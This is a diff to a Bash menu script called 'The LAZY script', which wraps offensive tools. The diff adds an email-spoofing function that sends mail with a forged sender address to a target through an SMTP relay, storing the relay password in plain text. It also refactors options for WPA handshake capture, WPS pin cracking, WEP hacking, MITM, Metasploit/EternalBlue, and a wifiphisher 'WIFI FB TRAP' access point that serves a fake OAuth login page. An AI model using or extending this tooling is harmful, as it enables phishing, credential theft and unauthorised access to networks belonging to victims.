@@ -3,7 +3,7 @@ VERSION=1.9.2
 HOWMANYTOOLS=22
 BACKL="0"
 #############DEFAULTS###############
-#TITLEBAR="The LAZY script"
+
 #setting yellow-start 
 	YS="\e[1;33m"
 #setting color-end
@@ -39,35 +39,57 @@ function banner
 	echo -e "$RS    The  ███████╗██║  ██║███████╗   ██║  script$CE"
 	echo -e "$RS         ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   $CE"
 	echo -e ""$YS"if"$CE") Ifconfig"
-	echo -e ""$YS" 1"$CE") Enable $WLANN                      "$YS"d1"$CE") Disable $WLANN"
-	echo -e ""$YS" 2"$CE") Enable $WLANNM                   "$YS"d2"$CE") Disable $WLANNM"
-	echo -e ""$YS" 3"$CE") Change MAC                        "$YS"d3"$CE") Restore original MAC"
+	echo -e ""$YS" 1"$CE") Enable $WLANN      "$YS"d1"$CE") Disable $WLANN        "$RS"|"$CE" "$YS"start"$CE") 1 2 3"
+	echo -e ""$YS" 2"$CE") Enable $WLANNM   "$YS"d2"$CE") Disable $WLANNM     "$RS"|"$CE"  "$YS"stop"$CE") d1 d2 d3"
+	echo -e ""$YS" 3"$CE") Change MAC        "$YS"d3"$CE") Restore original MAC "$RS"|"$CE""$YS"update"$CE") Check for updates"
 	if [ -f /usr/bin/anonym8 ]
 	then
-	echo -e ""$YS" 4"$CE") Enable anonym8                    "$YS"d4"$CE") Disable anonym8"
+	echo -e ""$YS" 4"$CE") Enable anonym8    "$YS"d4"$CE") Disable anonym8      "$RS"|"$CE""$YS"errors"$CE") Fix some errors"
 	else
-	echo -e ""$RS" 4"$CE") Enable anonym8                    "$RS"d4"$CE") Disable anonym8"
+	echo -e ""$RS" 4"$CE") Enable anonym8    "$RS"d4"$CE") Disable anonym8      "$RS"|"$CE""$YS"errors"$CE") Fix some errors"
 	fi
 	if [ -f /usr/bin/anonsurf ]
 	then
-	echo -e ""$YS" 5"$CE") Enable anonsurf                   "$YS"d5"$CE") Disable anonsurf"
-	echo -e ""$YS" 6"$CE") Status of anonsurf                "$YS"d6"$CE") Restart anonsurf"
+	echo -e ""$YS" 5"$CE") Enable anonsurf   "$YS"d5"$CE") Disable anonsurf     "$RS"|"$CE"    "$YS"ks"$CE") Keyboard shortucts"
+	echo -e ""$YS" 6"$CE") Anonsurf's status "$YS"d6"$CE") Restart anonsurf     "$RS"|"$CE""
 	else
-	echo -e ""$RS" 5"$CE") Enable anonsurf                   "$RS"d5"$CE") Disable anonsurf"
-	echo -e ""$RS" 6"$CE") Status of anonsurf                "$RS"d6"$CE") Restart anonsurf"	
+	echo -e ""$RS" 5"$CE") Enable anonsurf   "$RS"d5"$CE") Disable anonsurf     "$RS"|"$CE"    "$YS"ks"$CE") Keyboard shortucts"
+	echo -e ""$RS" 6"$CE") Anonsurf's status "$RS"d6"$CE") Restart anonsurf     "$RS"|"$CE""	
 	fi
-	echo -e ""$YS" 7"$CE") View your Public IP"
-	echo -e ""$YS" 8"$CE") View your MAC"
-	echo -e ""$YS" 9"$CE") TOOLS"
-	echo -e ""$YS"10"$CE") Handshake       (WPA-WPA2)        "$YS"start"$CE") 1 2 3"
-	echo -e ""$YS"11"$CE") Find WPS pin    (WPA-WPA2)         "$YS"stop"$CE") d1 d2 d3"
-	echo -e ""$YS"12"$CE") WEP hacking     (WEP)            "$YS"update"$CE") Check for updates"
-	echo -e ""$YS"13"$CE") MITM                             "$YS"errors"$CE") Fix some errors"
-	echo -e ""$YS"14"$CE") Metasploit                           "$YS"ks"$CE") Keyboard shortucts"
+	echo -e ""$YS" 7"$CE") View Public IP   "
+	echo -e ""$YS" 8"$CE") View MAC         "
+	echo -e ""$YS" 9"$CE") TOOLS             "$YS"15"$CE") Spoof EMAIL"
+	echo -e ""$YS"10"$CE") Handshake    "
+	echo -e ""$YS"11"$CE") Find WPS pin "
+	echo -e ""$YS"12"$CE") WEP hacking  "
+	echo -e ""$YS"13"$CE") MITM         "
+	echo -e ""$YS"14"$CE") Metasploit   "   
 	echo -e ""$YS" 0"$CE") EXIT"
 	echo "Choose: "
 	read -e YORNAA
 	clear
+}
+function enable_wlan
+{
+	echo -e "Enabling $WLANN..."
+	rfkill unblock wifi; rfkill unblock all
+	(ifconfig $WLANN up &>/dev/null && echo -e "Done" ) || echo -e ""$RS"Error. I can't find your wireless adapter"$CE""
+}
+function disable_wlan
+{
+	echo -e "Disabling $WLANN..."
+	rfkill unblock wifi; rfkill unblock all
+	(ifconfig $WLANN down &>/dev/null && echo -e "Done" ) || echo -e ""$RS"Error. I can't find your wireless adapter."$CE""
+}
+function stop_monitor
+{
+	echo -e "Disabling $WLANNM..."
+	echo -e "Stopping monitor mode..."
+	(airmon-ng stop $WLANNM &>/dev/null && echo -e "Done" ) || echo -e ""$RS"Error stoping monitor mode."$CE""
+	echo -e "ok..."
+	echo -e "Starting network-manager service..."
+	service network-manager start
+	echo -e "ok..."
 }
 function interface_selection
 {
@@ -102,6 +124,30 @@ sleep 1
 exec bash "$0"
 fi
 export MYINT
+}
+function change_mac
+{
+	interface_selection
+	clear
+	echo -e "Change it to a random or specific?("$YS"r"$CE"/"$YS"s"$CE")("$YS"Enter"$CE"=r): "
+	read -e RORS
+	clear
+	if [ "$RORS" != "s" ]
+	then
+		echo -e "Changing mac address of $MYINT to a random one..."
+		ifconfig $MYINT down
+		macchanger -r $MYINT
+		ifconfig $MYINT up
+		echo -e "Done."
+	else
+		echo -e "Enter the MAC you want:"
+		read -e SMAC
+		echo -e "Changing mac address of $MYINT to $SMAC..."
+		ifconfig $MYINT down
+		macchanger -m $SMAC $MYINT
+		ifconfig $MYINT up
+		echo -e "Done."
+	fi
 }
 function set_interface_number
 {
@@ -2362,74 +2408,202 @@ function eternalblue
 }
 function start_menu
 {
-	echo -e "Enabling $WLANN..."
-	rfkill unblock wifi; rfkill unblock all
-	ifconfig $WLANN up
-	echo -e "$WLANN enabled"
+	enable_wlan
 	echo -e "Enabling $WLANNM..."
 	echo -e "Killing services..."
-	airmon-ng check kill
+	airmon-ng check kill | grep "nothing"
 	echo -e "Done."
 	echo -e "Starting monitor mode..."
-	airmon-ng start $WLANN
+	airmon-ng start $WLANN | grep "monitor mode" | awk -F "(" {'print $2'} | cut -d ')' -f1
 	echo -e "Done."
 	echo -e "Changing mac address of $WLANNM to 00:11:22:33:44:55..."
 	ifconfig $WLANNM down
-	macchanger -m 00:11:22:33:44:55 $WLANNM | grep "New MAC:"
+	macchanger -m 00:11:22:33:44:55 $WLANNM | grep "New MAC:" 
 	ifconfig $WLANNM up
 	echo -e "Done."
 }
 function stop_menu
 {
-	echo -e "Changing mac address of $WLANNM to the original one..."
-	ifconfig $WLANNM down
-	macchanger -p $WLANNM
-	ifconfig $WLANNM up
-	echo -e "Disabling $WLANNM..."
-	echo -e "Stopping monitor mode..."
-	airmon-ng stop $WLANNM
-	echo -e "ok..."
-	echo -e "Starting network-manager service..."
-	service network-manager start
-	echo -e "ok..."
+	stop_monitor
 	echo -e "Changing mac address of $WLANN to the original one..."
 	ifconfig $WLANN down
-	macchanger -p $WLANN
+	macchanger -p $WLANN | grep "Current MAC:"
 	ifconfig $WLANN up
-	echo -e "Changing mac address of eth0 to the original one..."
-	ifconfig eth0 down
-	macchanger -p eth0
-	ifconfig eth0 up
-	echo -e "Done."
 	echo -e "SUCCESS!"
 }
-
-
-
-
-
-####################################
-printf '\033]2;The LAZY script\a'
-if [ "$ONETIMEPERLAUNCH" != "1" ]
-then
-	one_time_per_launch_ks
-fi
-####################################
-if [ -f ""$LPATH"/IAGREE.txt" ]
-then
-
-	if [ ! -f ""$LPATH"/wlan.txt" ]
+function spoof_email
+{
+while true
+do
+	sm=0
+	clear
+	if [ ! -d /bin/lscript/smtp ]
 	then
-		set_interface_number
+		mkdir /bin/lscript/smtp
 	fi
-clear
-WLANNM=$(cat "$LPATH"/wlanmon.txt)
-WLANN=$(cat "$LPATH"/wlan.txt)
-export WLANNM
-export WLANN
-banner
-####check if it is ks
-var1=1
+	echo -e ""$RS"YOU SHOULD FIRST SIGN UP ON https://www.smtp2go.com AND VERIFY YOUR EMAIL."$CE""
+	if [ ! -f /bin/lscript/smtp/smtpemail.txt ]
+	then
+		echo -e ""$YS" 1"$CE") Set your SMTP email and pass     "$RS"NOT SET"$CE""
+	else
+		read smtpemail < /bin/lscript/smtp/smtpemail.txt
+		echo -e ""$YS" 1"$CE") Set your SMTP email and pass     Current: "$YS""$smtpemail""$CE""
+	fi
+	echo -e ""$YS" 2"$CE") Send a spoofed email"
+	echo -e ""$YS" 3"$CE") Clear your SMTP email and pass from lscript"
+	echo -e ""$YS"back"$CE") Go back"
+	echo -e ""$YS" 0"$CE") EXIT"
+	read SMTP
+	if [ "$SMTP" = "1" ]
+	then
+		clear
+		echo -e "Enter your EMAIL with which you signed up on smtp2go.com: "
+		read SMTPEMAIL
+		echo -e "Enter your smtp2g password(find it here: https://app.smtp2go.com/settings/users ): "
+		read SMTPPASS
+		clear
+		echo "$SMTPEMAIL" > /bin/lscript/smtp/smtpemail.txt
+		echo "$SMTPPASS" > /bin/lscript/smtp/smtppass.txt 
+		echo -e "Credentials saved on /bin/lscript/smtp"
+		sleep 3
+	elif [ "$SMTP" = "3" ]
+	then
+		if [ -f /bin/lscript/smtp/smtpemail.txt ]
+		then
+			rm /bin/lscript/smtp/smtpemail.txt
+			echo -e "Email removed"
+		else
+			echo -e "Not email found"
+		fi
+		if [ -f /bin/lscript/smtp/smtppass.txt ]
+		then
+			rm /bin/lscript/smtp/smtppass.txt
+			echo -e "Password removed"
+		else
+			echo -e "Not password found"
+		fi
+		sleep 2
+		continue
+	elif [ "$SMTP" = "0" ]
+	then
+		clear
+		exit
+	elif [ "$SMTP" = "back" ]
+	then
+		clear
+		break
+	elif [ "$SMTP" = "2" ]
+	then
+		while true
+		do
+		clear
+		if [ ! -f /bin/lscript/smtp/smtpemail.txt ]
+		then
+			echo -e "No smtp email found."
+			sm=1
+		fi
+		if [ ! -f /bin/lscript/smtp/smtppass.txt ]
+		then
+			echo -e "No smtp pass found."
+			sm=1
+		fi
+		if [ "$sm" = 1 ]
+		then
+			break
+		fi
+		read smtppass < /bin/lscript/smtp/smtppass.txt
+		read smtpemail < /bin/lscript/smtp/smtpemail.txt
+		clear
+		echo -e "Your email is "$RS""$smtpemail""$CE""
+		echo -e ""
+		echo -e "Enter the target's email: "
+		read TARGETSEMAIL
+		echo -e "Enter the email that you want the target to see: "
+		read SPOOFEDEMAIL
+		echo -e "Enter the subject of the message: "
+		read SUBJECTEMAIL
+		echo -e "Enter the message: "
+		read MESSAGEEMAIL
+		echo -e "Enter the smtp server ("$YS"Enter"$CE"=mail.smtp2go.com): "
+		read SMTPSERVER
+		if [ "$SMTPSERVER" = "" ]
+		then
+			SMTPSERVER="mail.smtp2go.com"
+		fi
+		echo -e "Enter the smtp port ("$YS"Enter"$CE"=2525): "
+		read SMTPPORT
+		if [ "$SMTPPORT" = "" ]
+		then
+			SMTPPORT="2525"
+		fi
+		echo -e "Press "$YS"enter"$CE" to send the message to "$TARGETSEMAIL""
+		read 
+		clear
+		sendemail -f $SPOOFEDEMAIL -t $TARGETSEMAIL -u $SUBJECTEMAIL -m $MESSAGEEMAIL -s "$SMTPSERVER":"$SMTPPORT" -xu "$smtpemail" -xp "$smtppass"
+		echo -e "$PAKTGB"
+		read -e -n 1 -r
+		break
+		done
+	fi
+done
+}
+function new_terminal
+{
+		while true
+		do
+		clear
+		CHECKMON=$(ifconfig | grep "mon")
+		if [ "$CHECKMON" = "" ]
+		then
+			echo -e "Monitor mode is not enabled."
+			echo -e ""
+			echo -e "Do you want to enable monitor mode? "$YNYES": "
+			read MONITOREN
+			if [ "$MONITOREN" = "n" ]
+			then
+			#~ echo -e "Select 'start' or '2' to enable it"
+				echo -e "$PAKTGB"
+				$READAK
+				clear
+				exec bash "$0"
+			else
+				start_menu
+				continue
+			fi
+		else
+			if [ "$YORNAA" = "10" ]
+			then
+				echo -e "Moving into new terminal..."
+				sleep 1
+				FJC=0
+				export FJC
+				gnome-terminal --geometry 87x35+9999+0 -e lh1
+				sleep 1
+				exec bash "$0"
+				break
+			elif [ "$YORNAA" = "11" ]
+			then
+				clear
+				echo -e "Moving into new terminal..."
+				sleep 1
+				gnome-terminal --geometry 80x25+9999+0 -e lh3
+				sleep 1
+				exec bash "$0"
+				break
+			elif [ "$YORNAA" = "12" ]
+			then
+				echo -e "Moving into new terminal..."
+				sleep 1
+				gnome-terminal --geometry 80x25+9999+0 -e lh4
+				sleep 1
+				exec bash "$0"
+				break
+			fi
+		fi
+		done
+}
+function check_if_ks
+{
 	while [ $var1 -le $HOWMANY ]
 	do
 		read TITLE < "$KSPATH"/nums/"$var1".txt
@@ -2444,10 +2618,23 @@ var1=1
 		fi
 		var1=$(( var1+1 ))
 	done
-####
+}
+function wififb
+{
+	echo -e "Enter the name of the access point you want to create: "
+	read -e ESSIDAP
+	export ESSIDAP
+	xterm -geometry 90x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login; exec bash' & disown 
+}
+function main_options
+{
 	if [ "$YORNAA" = "0" ]
 	then
 		exit
+	elif [ "$YORNAA" = "15" ]
+	then
+		BACKL="1"
+		spoof_email
 	elif [ "$YORNAA" = "ks" ]
 	then
 		keyboard_shortcuts
@@ -2472,14 +2659,10 @@ var1=1
 		geany /bin/lscript/l
 	elif [ "$YORNAA" = "1" ]
 	then
-		echo -e "Enabling $WLANN..."
-		rfkill unblock wifi; rfkill unblock all
-		(ifconfig $WLANN up &>/dev/null && echo -e "Done" ) || echo -e "Error. I can't find your wireless adapter"
+		enable_wlan
 	elif [ "$YORNAA" = "d1" ]
 	then
-		echo -e "Disabling $WLANN..."
-		rfkill unblock wifi; rfkill unblock all
-		(ifconfig $WLANN down &>/dev/null && echo -e "Done" ) || echo -e "Error. I can't find your wireless adapter."
+		disable_wlan
 	elif [ "$YORNAA" = "2" ]
 	then
 		echo -e "Enabling $WLANNM..."
@@ -2490,45 +2673,19 @@ var1=1
 		(airmon-ng start $WLANN &>/dev/null && echo -e "Done" ) || echo -e "Error starting monitor mode."
 	elif [ "$YORNAA" = "d2" ]
 	then
-		echo -e "Disabling $WLANNM..."
-		echo -e "Stopping monitor mode..."
-		(airmon-ng stop $WLANNM &>/dev/null && echo -e "Done" ) || echo -e "Error stoping monitor mode."
-		echo -e "ok..."
-		echo -e "Starting network-manager service..."
-		service network-manager start
-		echo -e "ok..."
-		echo -e "$WLANN is probably up.Bring it down?"$YNNO": "
-		read -e YORN
-		if [ "$YORN" = "y" ] 
-		then
-			#rfkill unblock wifi
-			#rfkill unblock all
-			ifconfig $WLANN down
-			echo -e "$WLANN is now down."
-		fi
+		stop_monitor
+		#~ echo -e "$WLANN is probably up.Bring it down?"$YNNO": "
+		#~ read -e YORN
+		#~ if [ "$YORN" = "y" ] 
+		#~ then
+			#~ #rfkill unblock wifi
+			#~ #rfkill unblock all
+			#~ ifconfig $WLANN down
+			#~ echo -e "$WLANN is now down."
+		#~ fi
 	elif [ "$YORNAA" = "3" ]
 	then
-		interface_selection
-		clear
-		echo -e "Change it to a random or specific?("$YS"r"$CE"/"$YS"s"$CE")("$YS"Enter"$CE"=r): "
-		read -e RORS
-		clear
-		if [ "$RORS" != "s" ]
-		then
-			echo -e "Changing mac address of $MYINT to a random one..."
-			ifconfig $MYINT down
-			macchanger -r $MYINT
-			ifconfig $MYINT up
-			echo -e "Done."
-		else
-			echo -e "Enter the MAC you want:"
-			read -e SMAC
-			echo -e "Changing mac address of $MYINT to $SMAC..."
-			ifconfig $MYINT down
-			macchanger -m $SMAC $MYINT
-			ifconfig $MYINT up
-			echo -e "Done."
-		fi
+		change_mac
 	elif [ "$YORNAA" = "d3" ]
 	then
 		interface_selection
@@ -2582,105 +2739,9 @@ var1=1
 		clear
 		echo "Your MACs: "
 		macchanger -s $MYINT
-	elif [ "$YORNAA" = "10" ]
+	elif [ "$YORNAA" = "10" ] || [ "$YORNAA" = "11" ] || [ "$YORNAA" = "12" ]
 	then
-		while true
-		do
-		clear
-		CHECKMON=$(ifconfig | grep "mon")
-		if [ "$CHECKMON" = "" ]
-		then
-			echo -e "Monitor mode is not enabled."
-			echo -e ""
-			echo -e "Do you want to enable monitor mode? "$YNYES": "
-			read MONITOREN
-			if [ "$MONITOREN" = "n" ]
-			then
-			#~ echo -e "Select 'start' or '2' to enable it"
-				echo -e "$PAKTGB"
-				$READAK
-				clear
-				exec bash "$0"
-			else
-				start_menu
-				continue
-			fi
-		else
-			echo -e "Moving into new terminal..."
-			sleep 1
-			FJC=0
-			export FJC
-			gnome-terminal --geometry 87x35+9999+0 -e lh1
-			sleep 1
-			exec bash "$0"
-			break
-		fi
-		done
-	elif [ "$YORNAA" = "11" ]
-	then
-		while true
-		do
-		clear
-		CHECKMON=$(ifconfig | grep "mon")
-		if [ "$CHECKMON" = "" ]
-		then
-			echo -e "Monitor mode is not enabled."
-			echo -e ""
-			echo -e "Do you want to enable monitor mode? "$YNYES": "
-			read MONITOREN
-			if [ "$MONITOREN" = "n" ]
-			then
-			#~ echo -e "Select 'start' or '2' to enable it"
-				echo -e "$PAKTGB"
-				$READAK
-				clear
-				exec bash "$0"
-			else
-				start_menu
-				continue
-			fi
-		else
-			clear
-			echo -e "Moving into new terminal..."
-			sleep 1
-			gnome-terminal --geometry 80x25+9999+0 -e lh3
-			sleep 1
-			exec bash "$0"
-			break
-		fi
-		done
-	elif [ "$YORNAA" = "12" ]
-	then
-		while true
-		do
-		clear
-		CHECKMON=$(ifconfig | grep "mon")
-		if [ "$CHECKMON" = "" ]
-		then
-			echo -e "Monitor mode is not enabled."
-			echo -e ""
-			echo -e "Do you want to enable monitor mode? "$YNYES": "
-			read MONITOREN
-			if [ "$MONITOREN" = "n" ]
-			then
-			#~ echo -e "Select 'start' or '2' to enable it"
-				echo -e "$PAKTGB"
-				$READAK
-				clear
-				exec bash "$0"
-			else
-				start_menu
-				continue
-			fi
-		else
-			echo -e "Moving into new terminal..."
-			sleep 1
-			gnome-terminal --geometry 80x25+9999+0 -e lh4
-			sleep 1
-			exec bash "$0"
-			break
-		fi
-		done
+		new_terminal
 	elif [ "$YORNAA" = "13" ]
 	then
 		mitm_menu
@@ -2717,10 +2778,7 @@ var1=1
 		eternalblue
 	elif [ "$YORNAA" = "wififb" ]
 	then
-		echo -e "Enter the name of the access point you want to create: "
-		read -e ESSIDAP
-		export ESSIDAP
-		xterm -geometry 90x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login; exec bash' & disown 
+		wififb
 	elif [ "$YORNAA" = "start" ]
 	then		
 		start_menu
@@ -2733,6 +2791,32 @@ var1=1
 		clear
 		exit
 	fi
+####check if it is ks
+var1=1
+check_if_ks
+####
+}
+####################################
+printf '\033]2;The LAZY script\a'
+if [ "$ONETIMEPERLAUNCH" != "1" ]
+then
+	one_time_per_launch_ks
+fi
+####################################
+if [ -f ""$LPATH"/IAGREE.txt" ]
+then
+
+	if [ ! -f ""$LPATH"/wlan.txt" ]
+	then
+		set_interface_number
+	fi
+	clear
+	WLANNM=$(cat "$LPATH"/wlanmon.txt)
+	WLANN=$(cat "$LPATH"/wlan.txt)
+	export WLANNM
+	export WLANN
+	banner
+	main_options
 	if [ "$BACKL" = "1" ]
 	then
 		exec bash "$0"
